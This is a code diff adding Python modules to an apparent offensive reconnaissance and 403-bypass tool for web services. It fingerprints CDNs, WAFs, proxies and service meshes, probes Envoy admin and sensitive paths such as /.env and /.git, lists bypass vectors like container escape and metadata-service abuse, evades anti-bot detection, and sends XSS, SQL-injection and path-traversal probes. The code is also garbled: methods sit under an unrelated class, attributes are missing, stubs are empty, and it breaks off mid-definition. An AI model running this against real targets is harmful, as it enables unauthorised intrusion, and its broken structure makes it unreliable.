@@ -29,19 +29,1161 @@ import socket
 import ssl
 import h2.connection
 import h2.config
-from urllib.parse import urlparse
 import re
-from collections import defaultdict
 import concurrent.futures
 import threading
 import queue
+import logging
+import uuid
+import dns.resolver
+import hashlib
+from collections import defaultdict
 from datetime import datetime
+from urllib.parse import urlparse, urljoin
+from typing import Dict, Optional, List, Set
+
+class ServiceDiscoveryEnhanced:
+    def __init__(self):
+        self.discovered_services = set()
+        self.service_tree = {}
+        self.max_depth = 10
+        self.session = requests.Session()
+        self.session.timeout = 10
+        
+        # Advanced detection patterns
+        self.service_signatures = {
+            'microservice': {
+                'headers': ['x-service-name', 'x-microservice', 'x-service-id'],
+                'paths': ['/health', '/actuator/health', '/metrics', '/status'],
+                'response_patterns': ['service.*running', 'microservice', 'api.*version']
+            },
+            'api-gateway': {
+                'headers': ['x-gateway', 'x-api-gateway', 'x-kong', 'x-zuul'],
+                'paths': ['/gateway', '/api/v1', '/graphql', '/.well-known/'],
+                'response_patterns': ['gateway', 'api.*gateway', 'routing']
+            },
+            'load-balancer': {
+                'headers': ['x-load-balancer', 'x-forwarded-by', 'x-lb'],
+                'paths': ['/lb-status', '/haproxy?stats'],
+                'response_patterns': ['load.*balance', 'upstream', 'backend.*pool']
+            },
+            'service-mesh': {
+                'headers': ['x-envoy', 'x-istio', 'x-linkerd', 'server.*envoy'],
+                'paths': ['/stats', '/clusters', '/config_dump'],
+                'response_patterns': ['envoy', 'istio', 'linkerd', 'consul.*connect']
+            },
+            'database-proxy': {
+                'headers': ['x-db-proxy', 'x-pgbouncer', 'x-mysql-proxy'],
+                'paths': ['/db-status', '/pool-status'],
+                'response_patterns': ['database.*proxy', 'connection.*pool', 'pgbouncer']
+            },
+            'cache-layer': {
+                'headers': ['x-cache', 'x-redis', 'x-memcached', 'x-varnish'],
+                'paths': ['/cache-status', '/redis-info'],
+                'response_patterns': ['redis', 'memcached', 'varnish', 'cache.*hit']
+            },
+            'message-queue': {
+                'headers': ['x-queue', 'x-rabbitmq', 'x-kafka', 'x-sqs'],
+                'paths': ['/queue-status', '/management', '/metrics'],
+                'response_patterns': ['rabbitmq', 'kafka', 'queue', 'message.*broker']
+            }
+        }
+        
+        # Container orchestration signatures
+        self.container_patterns = {
+            'kubernetes': {
+                'headers': ['x-kubernetes', 'x-k8s', 'x-pod-name', 'x-namespace'],
+                'dns_patterns': [r'.*\.svc\.cluster\.local'],
+                'paths': ['/metrics', '/healthz'],
+                'env_indicators': ['KUBERNETES_SERVICE', 'POD_NAME', 'NAMESPACE']
+            },
+            'docker': {
+                'headers': ['x-container-id', 'x-docker', 'x-container-name'],
+                'paths': ['/docker-health', '/container-info'],
+                'response_patterns': ['container.*id', 'docker.*image']
+            },
+            'ecs': {
+                'headers': ['x-amzn-trace-id', 'x-ecs-task', 'x-aws-region'],
+                'paths': ['/task-metadata', '/stats'],
+                'response_patterns': ['ecs.*task', 'aws.*fargate']
+            },
+            'cloud-run': {
+                'headers': ['x-cloud-run', 'x-goog-', 'function-execution-id'],
+                'paths': ['/metadata', '/health'],
+                'response_patterns': ['cloud.*run', 'google.*cloud']
+            }
+        }
+
+    def discover_backend_chain(self, entry_point: str, depth: int = 0) -> Dict:
+        if depth >= self.max_depth or entry_point in self.discovered_services:
+            return {}
+        
+        self.discovered_services.add(entry_point)
+        service_info = self._analyze_service(entry_point)
+        self.service_tree[entry_point] = service_info
+        
+        next_hop = self._find_next_service(service_info)
+        if next_hop:
+            self.discover_backend_chain(next_hop, depth + 1)
+        
+        return self.service_tree
+
+    def _analyze_service(self, endpoint: str) -> Dict:
+        """Ultra-advanced service analysis with multi-vector detection"""
+        return {
+            'type': self._detect_service_type(endpoint),
+            'container_info': self._get_container_info(endpoint),
+            'service_mesh_info': self._get_service_mesh_info(endpoint),
+            'next_hop': None,
+            'endpoint': endpoint,
+            'timestamp': int(time.time())
+        }
+
+    def _detect_service_type(self, endpoint: str) -> str:
+        """Multi-layered service type detection with forensic precision"""
+        detection_scores = {}
+        
+        try:
+            # Phase 1: Header-based detection
+            response = self._safe_request('GET', endpoint, timeout=5)
+            if not response:
+                return 'unknown'
+            
+            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+            
+            # Score each service type based on header signatures
+            for service_type, signatures in self.service_signatures.items():
+                score = 0
+                
+                # Header analysis
+                for header_pattern in signatures['headers']:
+                    for header_name, header_value in headers.items():
+                        if header_pattern in header_name or header_pattern in header_value:
+                            score += 10
+                
+                # Response content analysis
+                response_text = response.text.lower()
+                for pattern in signatures['response_patterns']:
+                    if re.search(pattern, response_text):
+                        score += 5
+                
+                detection_scores[service_type] = score
+            
+            # Phase 2: Endpoint probing for confirmation
+            parsed_url = urlparse(endpoint)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            
+            for service_type, signatures in self.service_signatures.items():
+                for probe_path in signatures['paths']:
+                    probe_url = urljoin(base_url, probe_path)
+                    probe_response = self._safe_request('GET', probe_url, timeout=3)
+                    
+                    if probe_response and probe_response.status_code == 200:
+                        detection_scores[service_type] = detection_scores.get(service_type, 0) + 15
+                        
+                        # Deep content analysis of probe responses
+                        probe_text = probe_response.text.lower()
+                        for pattern in signatures['response_patterns']:
+                            if re.search(pattern, probe_text):
+                                detection_scores[service_type] += 10
+            
+            # Phase 3: Advanced behavior analysis
+            # Check for REST API patterns
+            if self._is_rest_api(endpoint):
+                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 8
+            
+            # Check for GraphQL
+            if self._is_graphql(endpoint):
+                detection_scores['api-gateway'] = detection_scores.get('api-gateway', 0) + 12
+            
+            # Check for WebSocket support
+            if self._supports_websocket(endpoint):
+                detection_scores['microservice'] = detection_scores.get('microservice', 0) + 6
+            
+            # Phase 4: Return highest scoring service type
+            if detection_scores:
+                return max(detection_scores.items(), key=lambda x: x[1])[0]
+            
+            return 'unknown'
+            
+        except Exception as e:
+            return 'error'
+
+    def _get_container_info(self, endpoint: str) -> Dict:
+        """Advanced container orchestration detection for bypass strategies"""
+        container_info = {
+            'orchestrator': 'unknown',
+            'container_id': None,
+            'image': None,
+            'namespace': None,
+            'cluster': None,
+            'bypass_hints': []
+        }
+        
+        try:
+            response = self._safe_request('GET', endpoint, timeout=5)
+            if not response:
+                return container_info
+            
+            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+            
+            # Kubernetes detection with bypass intelligence
+            k8s_score = 0
+            for header_name, header_value in headers.items():
+                # Direct Kubernetes headers
+                if any(k8s_header in header_name for k8s_header in ['x-kubernetes', 'x-k8s', 'x-pod-name']):
+                    k8s_score += 10
+                    container_info['orchestrator'] = 'kubernetes'
+                    
+                    if 'x-pod-name' in header_name:
+                        container_info['container_id'] = header_value
+                    if 'x-namespace' in header_name:
+                        container_info['namespace'] = header_value
+            
+            # Advanced Kubernetes detection via service patterns
+            parsed_url = urlparse(endpoint)
+            hostname = parsed_url.hostname
+            
+            # Check for Kubernetes DNS patterns
+            if hostname and '.svc.cluster.local' in hostname:
+                k8s_score += 15
+                container_info['orchestrator'] = 'kubernetes'
+                container_info['cluster'] = 'detected'
+                # Extract service and namespace from DNS
+                parts = hostname.split('.')
+                if len(parts) >= 3:
+                    container_info['namespace'] = parts[1]
+            
+            # Probe Kubernetes-specific endpoints
+            k8s_probes = ['/metrics', '/healthz', '/readyz', '/livez']
+            for probe in k8s_probes:
+                probe_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", probe)
+                probe_response = self._safe_request('GET', probe_url, timeout=3)
+                
+                if probe_response and probe_response.status_code == 200:
+                    k8s_score += 5
+                    # Look for Prometheus metrics (common in K8s)
+                    if 'prometheus' in probe_response.text.lower() or '# TYPE' in probe_response.text:
+                        k8s_score += 10
+                        container_info['orchestrator'] = 'kubernetes'
+            
+            # Docker detection
+            docker_indicators = ['x-container-id', 'x-docker', 'docker-content-digest']
+            for header_name, header_value in headers.items():
+                if any(docker_header in header_name for docker_header in docker_indicators):
+                    container_info['orchestrator'] = 'docker'
+                    if 'container-id' in header_name:
+                        container_info['container_id'] = header_value
+            
+            # ECS/Fargate detection
+            aws_indicators = ['x-amzn-trace-id', 'x-amzn-requestid', 'x-aws-']
+            ecs_score = sum(1 for header_name in headers.keys() 
+                           if any(aws_ind in header_name for aws_ind in aws_indicators))
+            
+            if ecs_score >= 2:
+                container_info['orchestrator'] = 'ecs'
+                # Try to get ECS task metadata
+                metadata_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", '/task-metadata')
+                metadata_response = self._safe_request('GET', metadata_url, timeout=3)
+                if metadata_response and 'TaskARN' in metadata_response.text:
+                    container_info['orchestrator'] = 'ecs-confirmed'
+            
+            # Generate bypass hints based on detected orchestration
+            if container_info['orchestrator'] == 'kubernetes':
+                container_info['bypass_hints'] = [
+                    'internal_service_communication',
+                    'cluster_internal_dns',
+                    'service_mesh_bypass',
+                    'pod_to_pod_direct'
+                ]
+            elif container_info['orchestrator'] == 'docker':
+                container_info['bypass_hints'] = [
+                    'container_network_bypass',
+                    'docker_api_exposure',
+                    'container_escape_vectors'
+                ]
+            elif container_info['orchestrator'] == 'ecs':
+                container_info['bypass_hints'] = [
+                    'aws_metadata_service',
+                    'task_role_assumption',
+                    'ecs_service_discovery'
+                ]
+            
+            return container_info
+            
+        except Exception as e:
+            container_info['error'] = str(e)
+            return container_info
+
+    def _get_service_mesh_info(self, endpoint: str) -> Dict:
+        """Comprehensive service mesh detection for advanced bypass techniques"""
+        mesh_info = {
+            'mesh_type': 'none',
+            'proxy_type': None,
+            'version': None,
+            'config_access': [],
+            'bypass_vectors': []
+        }
+        
+        try:
+            response = self._safe_request('GET', endpoint, timeout=5)
+            if not response:
+                return mesh_info
+            
+            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+            
+            # Envoy/Istio detection (most common)
+            envoy_indicators = ['server', 'x-envoy-', 'x-request-id']
+            envoy_score = 0
+            
+            for header_name, header_value in headers.items():
+                if 'envoy' in header_value:
+                    envoy_score += 15
+                    mesh_info['mesh_type'] = 'istio'
+                    mesh_info['proxy_type'] = 'envoy'
+                    
+                    # Extract Envoy version if available
+                    version_match = re.search(r'envoy/(\d+\.\d+\.\d+)', header_value)
+                    if version_match:
+                        mesh_info['version'] = version_match.group(1)
+                
+                if any(env_header in header_name for env_header in ['x-envoy-', 'x-b3-']):
+                    envoy_score += 10
+            
+            # Advanced Envoy detection via admin endpoints
+            parsed_url = urlparse(endpoint)
+            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+            
+            # Envoy admin endpoints (often exposed internally)
+            envoy_admin_paths = [
+                '/stats',
+                '/clusters',
+                '/config_dump',
+                '/server_info',
+                '/listeners',
+                '/runtime'
+            ]
+            
+            accessible_endpoints = []
+            for admin_path in envoy_admin_paths:
+                admin_url = urljoin(base_url, admin_path)
+                admin_response = self._safe_request('GET', admin_url, timeout=3)
+                
+                if admin_response and admin_response.status_code == 200:
+                    accessible_endpoints.append(admin_path)
+                    envoy_score += 20
+                    
+                    # Confirm it's Envoy by looking for specific content
+                    if 'envoy' in admin_response.text.lower():
+                        mesh_info['mesh_type'] = 'istio'
+                        mesh_info['proxy_type'] = 'envoy'
+                    
+                    # Look for cluster information for service discovery
+                    if admin_path == '/clusters' and 'outbound|' in admin_response.text:
+                        mesh_info['mesh_type'] = 'istio-confirmed'
+            
+            mesh_info['config_access'] = accessible_endpoints
+            
+            # Linkerd detection
+            linkerd_indicators = ['l5d-', 'x-linkerd', 'linkerd-']
+            for header_name, header_value in headers.items():
+                if any(linkerd_ind in header_name for linkerd_ind in linkerd_indicators):
+                    mesh_info['mesh_type'] = 'linkerd'
+                    mesh_info['proxy_type'] = 'linkerd-proxy'
+            
+            # Consul Connect detection
+            consul_indicators = ['x-consul-', 'consul-']
+            for header_name, header_value in headers.items():
+                if any(consul_ind in header_name for consul_ind in consul_indicators):
+                    mesh_info['mesh_type'] = 'consul-connect'
+                    mesh_info['proxy_type'] = 'consul-proxy'
+            
+            # Generate bypass vectors based on detected mesh
+            if mesh_info['mesh_type'] in ['istio', 'istio-confirmed']:
+                mesh_info['bypass_vectors'] = [
+                    'sidecar_bypass',
+                    'mtls_certificate_abuse',
+                    'service_identity_spoofing',
+                    'envoy_admin_exposure',
+                    'pilot_discovery_abuse'
+                ]
+                
+                if accessible_endpoints:
+                    mesh_info['bypass_vectors'].append('admin_api_exposed')
+            
+            elif mesh_info['mesh_type'] == 'linkerd':
+                mesh_info['bypass_vectors'] = [
+                    'linkerd_proxy_bypass',
+                    'tap_api_abuse',
+                    'control_plane_access'
+                ]
+            
+            elif mesh_info['mesh_type'] == 'consul-connect':
+                mesh_info['bypass_vectors'] = [
+                    'consul_api_access',
+                    'service_segmentation_bypass',
+                    'intention_manipulation'
+                ]
+            
+            return mesh_info
+            
+        except Exception as e:
+            mesh_info['error'] = str(e)
+            return mesh_info
+
+    def _find_next_service(self, service_info: Dict) -> Optional[str]:
+        """Intelligent next-hop discovery using multiple detection vectors"""
+        next_candidates = set()
+        endpoint = service_info.get('endpoint')
+        
+        if not endpoint:
+            return None
+        
+        try:
+            response = self._safe_request('GET', endpoint, timeout=5)
+            if not response:
+                return None
+            
+            headers = {k.lower(): v.lower() for k, v in response.headers.items()}
+            
+            # Method 1: Direct forwarding headers
+            forwarding_headers = [
+                'x-forwarded-to', 'x-upstream-server', 'x-backend-server',
+                'x-real-backend', 'x-upstream-addr', 'x-forwarded-host'
+            ]
+            
+            for header_name, header_value in headers.items():
+                if any(fwd_header in header_name for fwd_header in forwarding_headers):
+                    # Extract URL or hostname from header
+                    if '://' in header_value:
+                        next_candidates.add(header_value)
+                    elif ':' in header_value:  # hostname:port
+                        parsed_current = urlparse(endpoint)
+                        next_url = f"{parsed_current.scheme}://{header_value}"
+                        next_candidates.add(next_url)
+            
+            # Method 2: Service mesh upstream discovery
+            if service_info.get('service_mesh_info', {}).get('config_access'):
+                mesh_endpoints = service_info['service_mesh_info']['config_access']
+                
+                if '/clusters' in mesh_endpoints:
+                    parsed_url = urlparse(endpoint)
+                    clusters_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}", '/clusters')
+                    clusters_response = self._safe_request('GET', clusters_url, timeout=3)
+                    
+                    if clusters_response:
+                        # Parse Envoy cluster config for upstream services
+                        cluster_text = clusters_response.text
+                        upstream_matches = re.findall(r'outbound\|\d+\|\|([^:]+)', cluster_text)
+                        
+                        for upstream in upstream_matches:
+                            if upstream != parsed_url.hostname:  # Avoid self-reference
+                                next_url = f"{parsed_url.scheme}://{upstream}"
+                                next_candidates.add(next_url)
+            
+            # Method 3: API response analysis for service references
+            response_text = response.text
+            
+            # Look for API endpoints in responses (JSON APIs often reference other services)
+            api_url_patterns = [
+                r'"[a-zA-Z_]+_url":\s*"(https?://[^"]+)"',
+                r'"[a-zA-Z_]+_endpoint":\s*"(https?://[^"]+)"',
+                r'"service_url":\s*"(https?://[^"]+)"'
+            ]
+            
+            for pattern in api_url_patterns:
+                matches = re.findall(pattern, response_text)
+                for match in matches:
+                    if match != endpoint:  # Avoid self-reference
+                        next_candidates.add(match)
+            
+            # Method 4: DNS-based service discovery
+            parsed_url = urlparse(endpoint)
+            if parsed_url.hostname:
+                # Try common service discovery patterns
+                hostname_parts = parsed_url.hostname.split('.')
+                if len(hostname_parts) > 1:
+                    # Try different service variations
+                    service_variations = [
+                        f"api.{'.'.join(hostname_parts[1:])}",
+                        f"backend.{'.'.join(hostname_parts[1:])}",
+                        f"internal.{'.'.join(hostname_parts[1:])}",
+                        f"service.{'.'.join(hostname_parts[1:])}"
+                    ]
+                    
+                    for variation in service_variations:
+                        try:
+                            # Quick DNS resolution check
+                            socket.gethostbyname(variation)
+                            next_url = f"{parsed_url.scheme}://{variation}"
+                            if next_url != endpoint:
+                                next_candidates.add(next_url)
+                        except socket.gaierror:
+                            continue
+            
+            # Method 5: Container orchestration service discovery
+            container_info = service_info.get('container_info', {})
+            if container_info.get('orchestrator') == 'kubernetes':
+                # Try Kubernetes internal service patterns
+                if '.svc.cluster.local' in parsed_url.hostname:
+                    parts = parsed_url.hostname.split('.')
+                    if len(parts) >= 3:
+                        namespace = parts[1]
+                        # Try common service names in the same namespace
+                        common_services = ['api', 'backend', 'database', 'cache', 'auth']
+                        for service_name in common_services:
+                            k8s_url = f"{parsed_url.scheme}://{service_name}.{namespace}.svc.cluster.local"
+                            if k8s_url != endpoint:
+                                next_candidates.add(k8s_url)
+            
+            # Return the first valid candidate after basic validation
+            for candidate in next_candidates:
+                if self._validate_next_hop(candidate):
+                    return candidate
+            
+            return None
+            
+        except Exception as e:
+            return None
+
+    # Helper methods for advanced detection
+    def _safe_request(self, method: str, url: str, timeout: int = 5, **kwargs) -> Optional[requests.Response]:
+        """Safe HTTP request with error handling"""
+        try:
+            response = self.session.request(method, url, timeout=timeout, verify=False, **kwargs)
+            return response
+        except Exception:
+            return None
+
+    def _is_rest_api(self, endpoint: str) -> bool:
+        """Detect if endpoint is a REST API"""
+        try:
+            response = self._safe_request('OPTIONS', endpoint, timeout=3)
+            if response and 'allow' in response.headers:
+                allowed_methods = response.headers['allow'].upper()
+                rest_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
+                return sum(1 for method in rest_methods if method in allowed_methods) >= 3
+        except:
+            pass
+        return False
+
+    def _is_graphql(self, endpoint: str) -> bool:
+        """Detect GraphQL endpoint"""
+        try:
+            # Try GraphQL introspection query
+            graphql_query = {"query": "{ __schema { types { name } } }"}
+            response = self._safe_request('POST', endpoint, json=graphql_query, timeout=3)
+            
+            if response and response.status_code == 200:
+                response_data = response.json()
+                return '__schema' in str(response_data)
+                
+            # Also check for GraphQL-specific paths
+            parsed_url = urlparse(endpoint)
+            graphql_paths = ['/graphql', '/graphiql', '/api/graphql']
+            return any(path in parsed_url.path for path in graphql_paths)
+        except:
+            pass
+        return False
+
+    def _supports_websocket(self, endpoint: str) -> bool:
+        """Check WebSocket support"""
+        try:
+            headers = {
+                'Connection': 'Upgrade',
+                'Upgrade': 'websocket',
+                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                'Sec-WebSocket-Version': '13'
+            }
+            response = self._safe_request('GET', endpoint, headers=headers, timeout=3)
+            return response and response.status_code == 101
+        except:
+            pass
+        return False
+
+    def _validate_next_hop(self, candidate_url: str) -> bool:
+        """Validate if candidate URL is accessible and different service"""
+        try:
+            response = self._safe_request('HEAD', candidate_url, timeout=3)
+            return response and response.status_code < 500
+        except:
+            return False
+
+class ServiceMeshDetector:
+    def __init__(self):
+        self.mesh_signatures = {
+            'istio': ['x-istio-attributes', 'x-envoy', 'x-b3-traceid'],
+            'linkerd': ['l5d-dst-service', 'l5d-dst-client'],
+            'consul': ['x-consul-token', 'x-consul-index'],
+            'traefik': ['x-traefik-router', 'x-traefik-service']
+        }
+
+    def detect_mesh(self, headers: Dict, response_info: Dict) -> Dict:
+        mesh_data = {
+            'type': None,
+            'version': None,
+            'routing_info': {},
+            'metadata': {}
+        }
+        for mesh_type, signatures in self.mesh_signatures.items():
+            if any(sig in str(headers) for sig in signatures):
+                mesh_data['type'] = mesh_type
+                mesh_data['metadata'] = self._extract_mesh_metadata(mesh_type, headers)
+                break
+        return mesh_data
+
+    def _extract_mesh_metadata(self, mesh_type: str, headers: Dict) -> Dict:
+        metadata = {}
+        if mesh_type == 'istio':
+            metadata['trace_id'] = headers.get('x-b3-traceid')
+            metadata['request_id'] = headers.get('x-request-id')
+        elif mesh_type == 'linkerd':
+            metadata['dst_service'] = headers.get('l5d-dst-service')
+            metadata['dst_client'] = headers.get('l5d-dst-client')
+        return metadata
+
+class RequestTracker:
+    def __init__(self):
+        self.transformations = []
+
+    def track_request(self, request_id: str, layer: str, request_data: Dict) -> Dict:
+        transformation = {
+            'request_id': request_id,
+            'layer': layer,
+            'timestamp': datetime.utcnow(),
+            'headers': request_data.get('headers', {}),
+            'payload': request_data.get('payload', {}),
+            'mutations': self._analyze_mutations(request_data)
+        }
+        self.transformations.append(transformation)
+        return transformation
+
+    def _analyze_mutations(self, request_data: Dict) -> Dict:
+        return {
+            'headers_changed': self._detect_header_changes(request_data),
+            'payload_modified': self._detect_payload_changes(request_data),
+            'encoding_changes': self._detect_encoding_changes(request_data)
+        }
+
+    def _detect_header_changes(self, request_data: Dict) -> List[str]:
+        return []
+
+    def _detect_payload_changes(self, request_data: Dict) -> bool:
+        return False
+
+    def _detect_encoding_changes(self, request_data: Dict) -> List[str]:
+        return []
+
+class PayloadAnalyzer:
+    def __init__(self):
+        self.mutation_types = ['encoding', 'structure', 'content']
+
+    def analyze_mutations(self, original_payload: Dict, modified_payload: Dict) -> Dict:
+        mutations = {
+            'type': [],
+            'changes': [],
+            'severity': 'low'
+        }
+        if self._check_structural_changes(original_payload, modified_payload):
+            mutations['type'].append('structural')
+            mutations['severity'] = 'high'
+        encoding_changes = self._check_encoding_changes(original_payload, modified_payload)
+        if encoding_changes:
+            mutations['type'].append('encoding')
+            mutations['changes'].extend(encoding_changes)
+        return mutations
+
+    def _check_structural_changes(self, original: Dict, modified: Dict) -> bool:
+        return False
+
+    def _check_encoding_changes(self, original: Dict, modified: Dict) -> List[str]:
+        return []
+
+class StackHandler:
+    def __init__(self):
+        self.known_stacks = {
+            'cloudflare_nginx': {
+                'waf_headers': ['cf-ray', 'cf-cache-status'],
+                'proxy_headers': ['x-real-ip', 'x-forwarded-for']
+            },
+            'aws_waf_apache': {
+                'waf_headers': ['x-amzn-trace-id'],
+                'proxy_headers': ['x-forwarded-proto']
+            }
+        }
+
+    def handle_request(self, stack_type: str, request_data: Dict) -> Dict:
+        if stack_type in self.known_stacks:
+            return self._process_stack_specific(stack_type, request_data)
+        return request_data
+
+    def _process_stack_specific(self, stack_type: str, request_data: Dict) -> Dict:
+        stack_config = self.known_stacks[stack_type]
+        processed_data = request_data.copy()
+        # Placeholder for stack-specific logic
+        return processed_data
+
+class CommandGenerator:
+    def __init__(self, request_data: Dict):
+        self.request_data = request_data
+
+    def generate_curl(self) -> str:
+        cmd = ['curl']
+        for header, value in self.request_data.get('headers', {}).items():
+            cmd.append(f'-H "{header}: {value}"')
+        if 'payload' in self.request_data:
+            cmd.append(f"-d '{json.dumps(self.request_data['payload'])}'")
+        cmd.append(f"'{self.request_data['url']}'")
+        return ' '.join(cmd)
+
+    def generate_python(self) -> str:
+        code = [
+            'import requests',
+            'import json',
+            '',
+            f"url = '{self.request_data['url']}'",
+            f"headers = {json.dumps(self.request_data.get('headers', {}), indent=2)}",
+        ]
+        if 'payload' in self.request_data:
+            code.append(f"payload = {json.dumps(self.request_data['payload'], indent=2)}")
+            code.append('')
+            code.append('response = requests.post(url, headers=headers, json=payload)')
+        else:
+            code.append('')
+            code.append('response = requests.get(url, headers=headers)')
+        return '\n'.join(code)
+
+    def log_discovery(self, layer, discovery_type, details):
+        """Log discoveries with structured data"""
+        timestamp = time.strftime('%H:%M:%S')
+        print(f"[{timestamp}] 🔍 {layer} - {discovery_type}: {details}")
+
+        if layer not in self.chain_map['fingerprints']:
+            self.chain_map['fingerprints'][layer] = {}
+        self.chain_map['fingerprints'][layer][discovery_type] = details
+
+    def generate_unique_markers(self):
+        """Generate unique markers for request tracking"""
+        return {
+            'uuid': ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
+            'timestamp': str(int(time.time())),
+            'sequence': str(random.randint(100000, 999999))
+        }
+
+    def find_forbidden_endpoint(self):
+        """Find an endpoint that returns 403/401 for bypass testing"""
+        print("\n🔍 Phase 0: Finding Forbidden Endpoint for Testing")
+
+        # Browser-like headers per evitare detection WAF/anti-bot
+        browser_headers = {
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'it,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1'
+        }
+
+        # If specified by user, verify it's actually forbidden
+        if self.forbidden_endpoint:
+            try:
+                # Per cross-domain, aggiungere Referer
+                test_headers = browser_headers.copy()
+                forbidden_parsed = urlparse(self.forbidden_endpoint)
+                if forbidden_parsed.netloc != self.parsed_url.netloc:
+                    test_headers['Referer'] = self.target_url
+
+                response = self.session.get(self.forbidden_endpoint, headers=test_headers, timeout=10)
+                if response.status_code in [401, 403]:
+                    self.discovered_forbidden_endpoint = self.forbidden_endpoint
+                    self.log_discovery("Setup", "Forbidden Endpoint", f"User-provided: {self.forbidden_endpoint} ({response.status_code})")
+                    return self.forbidden_endpoint
+                else:
+                    print(f"  ⚠️ Provided endpoint returned {response.status_code}, not 403/401. Searching for alternatives...")
+            except Exception as e:
+                print(f"  ⚠️ Error checking provided endpoint: {e}")
+
+        # Search for common protected endpoints
+        common_protected = [
+            '/admin', '/wp-admin', '/administrator', '/secure', '/api/admin',
+            '/manage', '/console', '/portal', '/control', '/private',
+            '/restricted', '/staff', '/backend', '/cpanel', '/webadmin',
+            '/.env', '/.git', '/config', '/phpmyadmin', '/adminer'
+        ]
+
+        for endpoint in common_protected:
+            try:
+                url = self.target_url + endpoint
+                response = self.session.get(url, headers=browser_headers, timeout=10, allow_redirects=False)
+                if response.status_code in [401, 403]:
+                    self.discovered_forbidden_endpoint = url
+                    self.log_discovery("Setup", "Forbidden Endpoint Found", f"{endpoint} ({response.status_code})")
+                    return url
+            except:
+                continue
+
+        # If no forbidden endpoint found
+        if not self.skip_forbidden_tests:
+            print("  ⚠️ No forbidden endpoint found - some bypass tests will be limited")
+            print("  💡 Tip: Use --forbidden-endpoint to specify one, or --skip-forbidden-tests to skip these tests")
+
+        return None
+
+    def create_fingerprint_payloads(self):
+        """Create payloads to fingerprint each layer in the chain"""
+        markers = self.generate_unique_markers()
+
+        return {
+            'cdn_detection': {
+                'headers': {
+                    'X-CDN-Test': markers['uuid'],
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                },
+                'expected_responses': ['cloudflare', 'cloudfront', 'fastly', 'akamai']
+            },
+
+            'waf_detection': {
+                'payloads': [
+                    f"/?test=<script>alert('{markers['uuid']}')</script>",
+                    f"/?test=' OR 1=1 -- {markers['uuid']}",
+                    f"/?test=../../../etc/passwd#{markers['uuid']}"
+                ],
+                'headers': {'User-Agent': f'Mozilla/5.0 (test-{markers["uuid"]})'}
+            },
+
+            'proxy_detection': {
+                'headers': {
+                    'X-Forwarded-For': f'127.0.0.1,{markers["uuid"]}',
+                    'X-Real-IP': f'192.168.1.{markers["sequence"][:3]}',
+                    'X-Proxy-Test': markers['uuid']
+                }
+            },
+
+            'backend_detection': {
+                'paths': [
+                    f'/server-info?test={markers["uuid"]}',
+                    f'/server-status?test={markers["uuid"]}',
+                    f'/.env?test={markers["uuid"]}',
+                    f'/phpinfo.php?test={markers["uuid"]}'
+                ]
+            }
+        }
+
+    async def protocol_discovery(self):
+        """Discover supported protocols"""
+        print("\n🔍 Phase 1: Protocol Discovery")
+
+        # HTTP/2 Detection
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(self.target_url) as response:
+                    if hasattr(response, 'version') and response.version.major >= 2:
+                        self.protocols['http2'] = True
+                        self.log_discovery("Protocol", "HTTP/2", "Supported")
+        except:
+            pass
+
+        # HTTP/3 Detection (via Alt-Svc header)
+        try:
+            response = self.session.head(self.target_url)
+            alt_svc = response.headers.get('Alt-Svc', '')
+            if 'h3' in alt_svc or 'h3-29' in alt_svc:
+                self.protocols['http3'] = True
+                self.log_discovery("Protocol", "HTTP/3", f"Detected via Alt-Svc: {alt_svc}")
+        except:
+            pass
+
+        # WebSocket Detection
+        try:
+            ws_headers = {
+                'Upgrade': 'websocket',
+                'Connection': 'Upgrade',
+                'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                'Sec-WebSocket-Version': '13'
+            }
+            response = self.session.get(self.target_url, headers=ws_headers)
+            if response.status_code == 101:
+                self.protocols['websocket'] = True
+                self.log_discovery("Protocol", "WebSocket", "Upgrade supported")
+        except:
+            pass
+
+    def infrastructure_fingerprinting(self):
+        """Fingerprint infrastructure components"""
+        print("\n🔍 Phase 2: Infrastructure Fingerprinting")
+
+        fingerprints = self.create_fingerprint_payloads()
+
+        # CDN Detection
+        try:
+            response = self.session.get(self.target_url, headers=fingerprints['cdn_detection']['headers'])
+
+            # Analyze response headers for CDN signatures
+            cdn_indicators = {
+                'cloudflare': ['cf-ray', 'cf-cache-status', 'server.*cloudflare'],
+                'cloudfront': ['x-amz-cf', 'x-cache.*cloudfront'],
+                'fastly': ['fastly-debug', 'x-served-by.*fastly'],
+                'akamai': ['akamai-origin-hop', 'x-akamai'],
+                'incapsula': ['x-iinfo', 'incap_ses'],
+                'sucuri': ['x-sucuri', 'server.*sucuri']
+            }
+
+            detected_cdn = None
+            for cdn, indicators in cdn_indicators.items():
+                for indicator in indicators:
+                    for header, value in response.headers.items():
+                        if re.search(indicator, f"{header}: {value}", re.IGNORECASE):
+                            detected_cdn = cdn
+                            break
+                if detected_cdn:
+                    break
+
+            if detected_cdn:
+                self.log_discovery("CDN", "Detection", detected_cdn)
+                self.chain_map['layers'].append(f"CDN-{detected_cdn}")
+
+        except Exception as e:
+            self.log_discovery("CDN", "Error", str(e))
+
+        # WAF Detection
+        self.waf_fingerprinting(fingerprints['waf_detection'])
+
+        # Proxy Detection  
+        self.proxy_fingerprinting(fingerprints['proxy_detection'])
+
+        # Backend Detection
+        self.backend_fingerprinting(fingerprints['backend_detection'])
+
+    def waf_fingerprinting(self, waf_payloads):
+        """Advanced WAF fingerprinting"""
+        print("  🛡️ WAF Detection...")
+
+        waf_signatures = {
